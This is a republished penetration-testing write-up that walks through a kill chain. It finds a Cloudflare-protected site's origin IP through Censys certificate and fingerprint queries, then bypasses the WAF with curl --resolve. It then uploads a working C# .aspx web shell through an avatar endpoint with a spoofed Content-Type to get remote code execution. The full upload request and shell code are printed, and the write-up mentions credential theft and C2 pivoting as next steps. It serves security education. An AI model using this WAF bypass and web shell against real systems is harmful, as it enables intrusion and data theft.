# :globe_with_meridians: You Don’t Need a 0-Day for RCE: A Real-World Kill Chain

> **Original Source:** [You Don’t Need a 0-Day for RCE: A Real-World Kill Chain](https://infosecwriteups.com/you-dont-need-a-0-day-for-rce-a-real-world-kill-chain-e7ec690ba9a4)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## The Recon: A WAF in the Way


After mapping out the application, I hit a familiar brick wall: `Server: cloudflare`. My standard scanning payloads were getting instantly dropped, rate-limiting was aggressive, and the WAF was doing its job perfectly.


But any pentester knows that a WAF is only as strong as the perimeter it protects. If the backend server (the Origin) is directly accessible from the public internet, the WAF is nothing more than a suggestion. I needed to unmask that Origin IP.


Finding an Origin IP is an art form. Here are my go-to techniques using OSINT search engines:


1. Historical SSL Certificates (The “Forgetful Admin” Vector)


Before moving behind a WAF, servers often host their own SSL certificates. Search engines archive this data.


- Censys Query: `host.services.cert.names: "certguard-target.com"`


*(Pro-Tip: Companies often expose non-standard ports like 3306 or 8080 on the same IP or subnet. You can combine queries: *`host.services.cert.names:"certguard-target.com" and host.services.port:{"22", "3306", "3389", "8080", "27017"}`*)*2. Unique Identifiers (The Fingerprinting Vector)


If the SSL trick doesn’t work, search for unique elements from the website’s source code indexed on raw IPs.


Google Analytics IDs: Grab the ID (e.g., `UA-12345678-1`) from the source.


- Censys Query: `host.services.endpoints.http.body: "UA-12345678-1"`


Favicon Hashes: Calculate the MurmurHash3 of the site’s favicon.


- Censys Query*:* `host.services.endpoints.http.favicons.hash_md5: "hash"`


Copyright Strings:


- Censys Query*:* `web.endpoints.http.body:"\u00A9 copyright CertGuard 2024"`


3. HTML Titles & Open Ports


Sometimes, the backend IP answers HTTP requests directly with the same title as the main site.


- Censys Query: `web.endpoints.http.html_title: "CertGuard Secure Portal"`

### Leveling Up: Automating the Hunt & Further Reading


Clicking through the Censys or Shodan web interfaces is fine for a single target, but if you are doing at-scale bug bounty recon, you need automation.


You can use the official [Censys Command Line Interface (cencli)](https://github.com/Censys/cencli) to run these queries directly from your terminal. *(Note: Running advanced CLI queries requires a paid/premium tier. Censys also recently updated their authentication mechanisms, so the official GitHub repo is the best place to learn the setup).* For practical usage examples on how to automate your searches, check out this excellent guide: [Automate your Recon with Censys: How Pro Hackers Use It](https://pallabjyoti218.medium.com/automate-your-recon-with-censys-how-pro-hacker-use-censys-871aeabd517e).


If you want to dive deeper into advanced dorking and recon chains, here are a few highly recommended resources from the community:

## The Strategy: Smart Baselining & Visual Verification


Once you have a list of potential IPs from Shodan, Censys, or FOFA, you need to verify them. Many tutorials suggest simply spraying the IPs and looking for a 200 OK.


In the real world, this often fails.


If the application requires authentication, uses virtual hosting, or relies on specific API routing, hitting the root directory (`/`) of a raw IP will likely return a generic `401 Unauthorized`, a `403 Forbidden`, or a default IIS/Nginx splash page.


To distinguish your target’s infrastructure from random noise, you need a precise methodology. The correct approach relies on three core principles:


- Baseline the Target: You must first query the actual, public-facing domain to record the “truth” — the exact HTTP Status Code, Content-Length, Server header, and HTML Title.

- Contextual Probing: When scanning your list of potential Origin IPs, you cannot just send naked requests. You must inject the original `Host` header, target a specific deep path (e.g., `/account/profile`), and pass active session cookies.

- Smart Matching & Visual Inspection: Compare the responses from the raw IPs against your baseline. If the Status Code and Content-Length are an exact match (or very close), you take a screenshot to visually confirm the backend.

### Introducing OriginSniper 🎯


Doing this manually or writing messy one-liners for every engagement gets tedious. To automate this exact workflow, I wrote a lightweight Bash script: [OriginSniper](https://github.com/Nebtyy/OriginSniper/tree/main).


Instead of guessing, OriginSniper automates the entire verification pipeline using `httpx` and `gowitness`.


## Get Nebty’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Here is how it handles the heavy lifting:


- Auto-Baselining: It automatically fetches the baseline metrics from the target domain.

- Smart Probing: It scans your IP list, injecting the correct `Host` header and any cookies you provide.

- Color-Coded Matching: It generates a beautifully aligned terminal table, highlighting responses as EXACT (perfect match), CLOSE (similar content length), or NO (mismatch).

- Automated Screenshots: It pipes the successful hits into `gowitness` for immediate visual review.


Instead of fighting with long commands, you can verify your entire IP list with a single run:


```
# Advanced Scan: Target a specific path and pass an authentication cookie
./originsniper.sh -d certguard-target.com -i potential_ips.txt -p "/account/profile" -c "ASP.NET_SessionId=YOUR_VALID_COOKIE"
```


When the script finishes, you don’t need to sift through hundreds of generic error pages. You just look for the green EXACT match in your terminal and check the corresponding `gowitness` screenshot in your `./shots` folder. If it matches the authenticated application—you've successfully unmasked the Origin.

>

*Tooling Tip: You can grab the script from my *[GitHub repository](https://github.com/Nebtyy/OriginSniper/tree/main)*, use it out of the box, or use its core logic as a foundation to build your own custom OSINT pipeline.*


## The Execution


### Step 1: The Breakthrough


For my target, the Historical SSL method paid off. I found an IP address (`198.51.100.42`) belonging to a standard hosting provider.


*Locating the hidden Origin IP through SSL certificate fingerprints.*


To verify manually, I used the `curl --resolve` flag, which bypasses DNS and connects directly to a specific IP, while still sending the original `Host` header.


```
curl -i -s -k -X GET "https://certguard-target.com/auth/signin" \
--resolve certguard-target.com:443:198.51.100.42 \
-H "Host: certguard-target.com"
```


*HTTP 200 OK.* The server responded perfectly. No Cloudflare headers (`CF-RAY`, `cf-cache-status`), no blocks. The gates were open.

### Step 2: The Naked Backend


With the WAF bypassed, I configured Burp Suite to resolve `certguard-target.com` directly to `198.51.100.42`.


*Bypassing the WAF: Routing traffic directly to the Origin IP.*


Now, every request I made went straight to the undefended backend.


This is where the concept of Defense in Depth usually falls apart. During my initial testing *through* Cloudflare, any attempt to upload a `.aspx` shell or inject malicious payloads resulted in a hard `403 Forbidden` error from the WAF.


It became painfully obvious what was happening: the developers were relying *entirely* on the WAF to handle malicious input. They saw these `403` blocks in their Cloudflare dashboard and assumed their system was secure, treating the WAF as a silver bullet while leaving the actual backend logic completely naked.


*The WAF illusion: Payloads are blocked at the perimeter (403) but accepted by the naked backend (200).*


I navigated to the authenticated avatar upload function at `POST /api/v1/account/avatar/upload`. I attempted to upload a standard `.png` file, intercepted the request, and changed the file extension to `.aspx`.


Why `.aspx`? During my initial recon phase, the HTTP response headers from the naked Origin IP explicitly leaked `Server: Microsoft-IIS/10.0` and `X-Powered-By: ASP.NET`. When crafting a web shell, your payload's extension must match the backend's runtime environment so the server knows to execute it rather than just serve it as a static text file.*The Hacker’sCheat Sheet: Matching Payloads to Tech StacksIf you are mapping a target’s infrastructure and wondering which web shell extension to use, here is a quick reference guide:*


*A quick reference guide for matching web shell extensions to backend technologies.*


Knowing my target was an IIS/ASP.NET environment, I crafted a basic C# web shell. To bypass the weak backend validation, I deliberately left the `Content-Type` header as `image/png` while sending my `.aspx` payload:


```
POST /api/v1/account/avatar/upload HTTP/2
Host: certguard-target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="UploadedImage"; filename="shell.aspx"
Content-Type: image/png

<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c whoami";
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
%>
------WebKitFormBoundary--
```


Because I was talking directly to the Origin IP, there was no WAF to intercept the payload and trigger a `403 Forbidden`. The request sailed through. The backend application only checked the `Content-Type` provided in the request (`image/png`); it completely failed to validate the file extension.


Response: `{"StatusCode":"200","Description":"Image Updated Successfully"}`

### Step 3: RCE and Game Over


The application helpfully stored my “avatar” in a publicly accessible directory. I navigated to the generated URL:


`[https://certguard-target.com/uploads/avatars/990145821.aspx](https://certguard-target.com/uploads/avatars/990145821.aspx)`


Instead of an image rendering, the IIS web server executed my C# code. The screen returned plain text:


```
iis apppool\webapp_worker
```


*Achieving Remote Code Execution (RCE) via the unrestricted file upload.*Boom. Remote Code Execution.


From here, I had full command execution with application pool privileges. I could read the `web.config` to steal database credentials, exfiltrate the PII of thousands of users, or drop a more sophisticated C2 beacon to pivot into the internal network.

---

*Originally published on [Medium](https://infosecwriteups.com/you-dont-need-a-0-day-for-rce-a-real-world-kill-chain-e7ec690ba9a4). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
